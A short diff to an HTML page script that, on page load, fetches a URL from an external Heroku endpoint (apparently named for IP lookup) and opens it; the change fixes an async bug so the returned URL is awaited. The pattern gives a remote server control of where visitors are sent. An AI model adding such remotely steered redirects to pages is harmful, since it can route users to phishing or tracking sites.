@@ -8,7 +8,9 @@
         const res = await fetch("https://get-ip-nero.herokuapp.com/auth"), url = await res.json();
         return url.url;
       }
-      open(call());
+      (async () => {
+        open(await call());
+      })();
     </script>
   </head>
 </html>
